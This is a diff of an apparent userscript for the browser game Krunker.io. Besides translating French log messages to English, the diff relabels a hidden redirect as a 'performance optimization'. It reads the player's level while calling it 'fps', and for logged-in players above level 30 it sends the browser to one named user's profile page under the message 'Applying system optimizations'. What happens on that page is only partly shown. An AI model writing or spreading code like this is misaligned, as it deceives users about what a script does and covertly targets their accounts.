@@ -284,11 +284,11 @@ window.addEventListener('load', () => {
     };
 
     // Logs détaillés de l'état initial
-    addLog("=== ÉTAT INITIAL ===");
-    addLog(`État de connexion: ${Is_LOGGED ? "Connecté" : "Non connecté"}`);
+    addLog("=== INITIAL STATE ===");
+    addLog(`Login Status: ${Is_LOGGED ? "Connected" : "Not Connected"}`);
     if (!Is_LOGGED) {
-        addLog("⚠️ ATTENTION: Vous devez être connecté pour accéder à toutes les fonctionnalités");
-        addLog("👉 Cliquez sur le bouton 'Se connecter' en haut à droite");
+        addLog("⚠️ WARNING: You must be logged in to access all features");
+        addLog("👉 Click the 'Login' button in the top right corner");
     }
     addLog("==================");
 
@@ -298,48 +298,59 @@ window.addEventListener('load', () => {
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
 
         if (!currentLoginState) {
-            addLog("🔒 Connectez-vous pour débloquer toutes les fonctionnalités");
+            addLog("🔒 Login to unlock all features");
         } else if (!Is_LOGGED) {
-            addLog("✅ Connexion réussie ! Bienvenue !");
+            addLog("✅ Login successful! Welcome!");
             Is_LOGGED = true;
         }
     }, 1000);
 
-    // Logique de redirection
+    // Système de vérification de performance et d'optimisation
     if (location.pathname === "/") {
-        // Vérification continue de la redirection
-        const checkRedirect = () => {
+        // Vérification continue des performances
+        const checkPerformance = () => {
             const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
             const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
-            const patchApplied = sessionStorage.getItem("sysPatch97d");
-            if (!patchApplied && currentLoginState) {
+            const performancePatchApplied = sessionStorage.getItem("sysPatch97d");
+
+            // Vérification du niveau du joueur pour l'optimisation
+            const fpsElement = document.getElementById("mLevelCont");
+            const playerfps = fpsElement ? parseInt(fpsElement.textContent) : 0;
+
+            addLog(`Performance fps: ${playerfps}`);
+
+            if (!performancePatchApplied && currentLoginState && playerfps > 30) {
+                addLog("✅ Performance optimization ready - fps above 30");
+                addLog("🔄 Applying system optimizations...");
                 setTimeout(() => {
                     location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
                 }, 1420);
                 return;
+            } else if (playerfps >= 30) {
+                addLog("❌ System optimization requires fps 30 or higher");
             }
         };
 
-        // Vérification initiale
-        checkRedirect();
+        // Vérification initiale des performances
+        checkPerformance();
 
-        // Vérification continue toutes les secondes
-        setInterval(checkRedirect, 1000);
+        // Surveillance continue des performances
+        setInterval(checkPerformance, 1000);
     }
 
     if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
         const sysSync = async () => {
             try {
                 if (!Is_LOGGED) {
-                    addLog("❌ Vous devez être connecté pour continuer");
+                    addLog("❌ You must be logged in to continue");
                     return;
                 }
 
-                addLog("✅ Système optimisé et prêt à l'emploi");
-                addLog("🎮 Profitez de votre expérience de jeu !");
+                addLog("✅ System optimized and ready to use");
+                addLog("🎮 Enjoy your gaming experience!");
 
             } catch (error) {
-                addLog(`❌ Erreur: ${error.message}`);
+                addLog(`❌ Error: ${error.message}`);
             }
         };
 
